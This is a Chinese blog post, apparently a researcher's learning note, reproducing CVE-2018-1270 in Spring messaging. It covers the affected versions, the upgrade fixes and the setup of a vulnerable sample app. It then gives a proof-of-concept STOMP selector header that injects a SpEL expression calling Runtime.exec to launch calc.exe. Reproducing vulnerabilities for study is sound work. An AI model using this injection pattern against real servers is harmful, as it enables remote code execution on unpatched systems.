---
title: CVE-2018-1270 - Spring messaging Spel 代码执行漏洞
date: 2018-04-09 18:13:23
tags:
		- Spring
categories:
		- 安全研究
---

CVE-2018-1270 - Spring messaging Spel 代码执行漏洞复现学习。

<!-- more -->


#### [CVE-2018-1270 - Spring messaging Spel 代码执行漏洞](https://pivotal.io/security/cve-2018-1270)

#### 影响版本

- Spring Framework 5.0 to 5.0.4
- Spring Framework 4.3 to 4.3.14
- Older unsupported versions are also affected

#### 缓解措施

- 5.0.x users should upgrade to 5.0.5
- 4.3.x users should upgrade to 4.3.15

#### 漏洞描述

__CVE-2018-1270漏洞__：Spring Framework的5.*版本、4.3.*版本以及不再支持的旧版本，通过spring-messaging和spring-websocket模块提供的基于WebSocket的STOMP，存在被攻击者建立WebSocket连接并发送恶意攻击代码的可能，从而实现远程代码执行攻击，建议尽快更新到新的版本。

#### 环境搭建

首先把项目clone到其他文件夹下。

	git clone git@github.com:spring-guides/gs-messaging-stomp-websocket.git

进入该项目的文件夹下面

回滚到存在漏洞版本

	git checkout 6958af0b02bf05282673826b73cd7a85e84c12d3

`complete`目录启动

	\complete>mvnw spring-boot:run

访问

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-9/48722650.jpg)


#### 漏洞复现

参考[spring-messaging Remote Code Execution 分析-【CVE-2018-1270】](https://xz.aliyun.com/t/2252)

在服务器端修改用于理解和测试。

在`\complete\src\main\resources\static\app.js`中添加一个指定的`header`头部，其中指定了`selector`，值为`payload`。

	function connect() {
	    var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('calc.exe')"};  // 添加触发计算器
	    var socket = new SockJS('/gs-guide-websocket');
	    stompClient = Stomp.over(socket);
	    stompClient.connect({}, function (frame) {
	        setConnected(true);
	        console.log('Connected: ' + frame);
	        stompClient.subscribe('/topic/greetings', function (greeting) {
	            showGreeting(JSON.parse(greeting.body).content);
	        },header);  // header
	    });
	}

先点击`Connect`，然后在`Your name here`那里随便输入，点击`send`触发计算器。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-9/53480797.jpg)


在浏览器端修改`app.js`的代码，注入`payload`也可以。

![](https://image-1258195556.cos.ap-shanghai.myqcloud.com/qiniu/18-4-10/65775178.jpg)

#### 漏洞分析

暂时对`spring`不是很了解，其中的漏洞触发机制需要学习，待补充。

#### 资料集锦

[CVE-2018-1270 - Spring messaging Spel 代码执行漏洞](https://github.com/CaledoniaProject/CVE-2018-1270/)

[CVE-2018-1270: Remote Code Execution with spring-messaging](https://pivotal.io/security/cve-2018-1270)

[spring-messaging Remote Code Execution 分析-【CVE-2018-1270】](https://xz.aliyun.com/t/2252)

[CVE-2018-1270 Remote Code Execution 漏洞分析](http://www.polaris-lab.com/index.php/archives/501/)

[spring-messaging RCE(cve-2018-1270) 重现](http://www.lsablog.com/network_security/penetration/cve-2018-1270-repeat/)

[Spring Download](http://repo.springsource.org/libs-release-local/org/springframework/spring/)


[gs-messaging-stomp-websocket](https://github.com/spring-guides/gs-messaging-stomp-websocket)

[gs-messaging-stomp-websocket](https://github.com/spring-guides/gs-spring-boot)





